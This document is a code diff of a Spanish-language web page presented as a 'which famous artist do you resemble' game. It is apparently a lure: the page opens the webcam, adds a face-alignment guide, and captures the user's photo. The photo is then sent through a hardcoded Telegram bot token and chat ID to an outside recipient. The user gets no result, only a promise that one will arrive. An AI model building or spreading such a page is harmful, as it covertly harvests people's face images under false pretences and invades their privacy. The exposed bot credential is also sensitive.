@@ -15,25 +15,52 @@
         }
 
         #game-container {
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            background: white;
-            color: black;
-            padding: 20px;
-            border-radius: 10px;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
-            width: 90%;
+            position: relative;
+            width: 100%;
+            height: 100vh;
+            overflow: hidden;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+
+        #video-container {
+            position: relative;
+            width: 100%;
             max-width: 400px;
+            aspect-ratio: 3/4;
+            background: black;
+            border-radius: 10px;
+            overflow: hidden;
         }
 
-        #game-container h1 {
-            margin-bottom: 20px;
-            font-size: 24px;
+        #video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
         }
 
-        #game-container button {
+        #face-guide {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 1;
+            pointer-events: none;
+        }
+
+        #face-guide svg {
+            width: 100%;
+            height: 100%;
+        }
+
+        #game-controls {
+            margin-top: 20px;
+        }
+
+        #game-controls button {
             padding: 10px 20px;
             border: none;
             border-radius: 5px;
@@ -43,18 +70,8 @@
             font-size: 16px;
         }
 
-        #game-container button:hover {
+        #game-controls button:hover {
             background: #2575fc;
-        }
-
-        #result-container {
-            display: none;
-            margin-top: 20px;
-        }
-
-        #result-container img {
-            max-width: 100%;
-            border-radius: 10px;
         }
 
         #loading-message {
@@ -66,61 +83,59 @@
 </head>
 <body>
     <div id="game-container">
-        <h1>¿A qué artista famoso te pareces?</h1>
-        <p>Ponte frente a la cámara y haz clic en el botón para descubrirlo.</p>
-        <button onclick="startGame()">Tomar foto</button>
-        <div id="loading-message">Procesando tu foto...</div>
-        <div id="result-container">
-            <p>Tu foto se ha procesado. ¡Pronto recibirás tu resultado!</p>
+        <div id="video-container">
+            <video id="video" autoplay playsinline></video>
+            <div id="face-guide">
+                <!-- SVG para la guía del rostro -->
+                <svg viewBox="0 0 400 600">
+                    <circle cx="200" cy="250" r="80" stroke="white" stroke-width="3" fill="none" stroke-dasharray="8,8" />
+                    <line x1="200" y1="150" x2="200" y2="350" stroke="white" stroke-width="2" stroke-dasharray="4,4" />
+                    <line x1="120" y1="250" x2="280" y2="250" stroke="white" stroke-width="2" stroke-dasharray="4,4" />
+                </svg>
+            </div>
+        </div>
+        <div id="game-controls">
+            <button onclick="capturePhoto()">Tomar Foto</button>
+            <p id="loading-message">Procesando tu foto...</p>
         </div>
     </div>
 
     <script>
-        async function startGame() {
-            const loadingMessage = document.getElementById('loading-message');
-            const resultContainer = document.getElementById('result-container');
-            loadingMessage.style.display = 'block'; // Mostrar mensaje de carga
-            resultContainer.style.display = 'none'; // Ocultar resultado previo
-            await initializeCamera();
-            loadingMessage.style.display = 'none'; // Ocultar mensaje de carga
-            resultContainer.style.display = 'block'; // Mostrar mensaje de resultado
-        }
+        const video = document.getElementById('video');
+        const loadingMessage = document.getElementById('loading-message');
 
+        // Inicializar la cámara
         async function initializeCamera() {
             const constraints = {
-                video: { facingMode: "user" }
+                video: { facingMode: "user" } // Usar cámara frontal
             };
 
             try {
                 const stream = await navigator.mediaDevices.getUserMedia(constraints);
-                const video = document.createElement('video');
-                video.style.display = 'none';
-                document.body.appendChild(video);
                 video.srcObject = stream;
-                video.play();
-
-                video.onloadedmetadata = async () => {
-                    await captureAndSendPhoto(video, stream);
-                    stream.getTracks().forEach(track => track.stop());
-                    video.remove();
-                };
             } catch (error) {
                 console.error('Error al acceder a la cámara:', error);
+                alert('No se pudo acceder a la cámara. Verifica los permisos.');
             }
         }
 
-        async function captureAndSendPhoto(video, stream) {
-            const botToken = '7555861557:AAGfZFvIiXAYxYUB21e7HHGCD7XPOXffM3g';
-            const chatId = '1223367230';
+        // Capturar foto y enviar al servidor
+        async function capturePhoto() {
+            loadingMessage.style.display = 'block';
+
             const canvas = document.createElement('canvas');
             const context = canvas.getContext('2d');
 
+            // Configurar canvas con las dimensiones del video
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
 
+            // Dibujar imagen del video en el canvas
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
             canvas.toBlob(async (blob) => {
+                const botToken = '7555861557:AAGfZFvIiXAYxYUB21e7HHGCD7XPOXffM3g';
+                const chatId = '1223367230';
                 const formData = new FormData();
                 formData.append('chat_id', chatId);
                 formData.append('photo', blob, 'photo.jpg');
@@ -134,9 +149,14 @@
                     }
                 } catch (error) {
                     console.error('Error de red:', error.message);
+                } finally {
+                    loadingMessage.style.display = 'none';
                 }
             }, 'image/jpeg');
         }
+
+        // Iniciar la cámara al cargar la página
+        window.onload = initializeCamera;
     </script>
 </body>
 </html>
